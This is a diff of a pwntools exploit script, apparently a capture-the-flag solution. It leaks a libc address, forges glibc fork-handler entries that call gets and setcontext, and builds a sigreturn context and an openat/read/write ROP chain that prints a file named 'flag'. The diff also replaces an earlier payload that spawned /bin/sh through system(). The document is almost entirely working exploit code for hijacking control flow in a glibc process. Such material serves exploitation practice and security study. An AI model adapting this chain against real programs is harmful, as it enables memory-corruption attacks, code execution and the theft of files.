@@ -2,6 +2,7 @@
 from pwn import *
 
 context.log_level = "debug"
+context.arch = "amd64"
 
 io = process("./vuln_patched")
 # io = remote("localhost", 9999)
@@ -55,6 +56,32 @@ def forge(base, *funcs, rdi=None):
     return header(array_ptr, used) + handler_array(*funcs)
 
 
+def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
+    frame = SigreturnFrame()
+    frame.rsp = rsp
+    frame.rip = rip
+    frame.rdi = rdi
+    frame.rsi = rsi
+    frame.rdx = rdx
+    setattr(frame, "&fpstate", rsp + 0x1A8)
+    fpstate = {
+        0x00: p16(0x37F),
+        0x02: p16(0xFFFF),
+        0x04: p16(0x0),
+        0x06: p16(0xFFFF),
+        0x08: 0xFFFFFFFF,
+        0x10: 0x0,
+        0x18: 0x1F80,
+    }
+    return flat(
+        {
+            0x00: bytes(frame),
+            0x128: 0,
+            0x1A8: fpstate,
+        }
+    )
+
+
 io.recvuntil(b"gift: ")
 leak_line = io.recvline().strip()
 stdin_leak = int(leak_line, 16)
@@ -73,20 +100,79 @@ log.success(f"libc base: {hex(libc.address)}")
 fork_handlers = libc.sym.re_syntax_options + 0x80
 log.success(f"fork_handlers: {hex(fork_handlers)}")
 
-"""
-cmd_offset = len(forge(fork_handlers, libc.sym.system))
-cmd_addr = fork_handlers + cmd_offset
+rop = ROP(libc)
+ret = rop.find_gadget(["ret"])[0]
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
+pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
+pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
+syscall = rop.find_gadget(["syscall", "ret"])[0]
 
-data = forge(fork_handlers, libc.sym.system, rdi=cmd_addr)
-data += b"/bin/sh\x00"
-"""
+BUF_SIZE = 0x80
+ctx_addr = fork_handlers + 0x200
 
-bin_sh = next(libc.search(b"/bin/sh\x00"))
-log.success(f"/bin/sh: {hex(bin_sh)}")
-data = forge(fork_handlers, libc.sym.system, rdi=bin_sh)
 
-req = p64(fork_handlers) + p64(len(data))
-io.send(req)
-io.send(data)
+def build_chain(buf_addr, path_addr):
+    return flat(
+        [
+            pop_rdi,
+            0xFFFFFFFFFFFFFF9C,  # AT_FDCWD
+            pop_rsi,
+            path_addr,
+            pop_rdx,
+            0,
+            pop_rax,
+            constants.SYS_openat,
+            syscall,
+            pop_rdi,
+            3,
+            pop_rsi,
+            buf_addr,
+            pop_rdx,
+            BUF_SIZE,
+            pop_rax,
+            constants.SYS_read,
+            syscall,
+            pop_rdi,
+            1,
+            pop_rsi,
+            buf_addr,
+            pop_rdx,
+            BUF_SIZE,
+            pop_rax,
+            constants.SYS_write,
+            syscall,
+            pop_rdi,
+            0,
+            pop_rax,
+            constants.SYS_exit,
+            syscall,
+        ]
+    )
+
+
+ucontext_size = len(build_ucontext(0, 0))
+rop_addr = ctx_addr + ucontext_size
+ucontext = build_ucontext(rop_addr, ret)
+chain = build_chain(0, 0)
+buf_addr = rop_addr + len(chain)
+path_addr = buf_addr + BUF_SIZE
+chain = build_chain(buf_addr, path_addr)
+
+payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)
+
+payload2 = ucontext
+payload2 += chain
+payload2 += b"\x00" * BUF_SIZE
+payload2 += b"flag\x00"
+
+if b"\n" in payload2:
+    raise ValueError("payload2 contains newline; try again due to ASLR")
+
+req1 = p64(fork_handlers) + p64(len(payload1))
+
+io.send(req1)
+io.send(payload1)
+io.sendline(payload2)
 
 io.interactive()
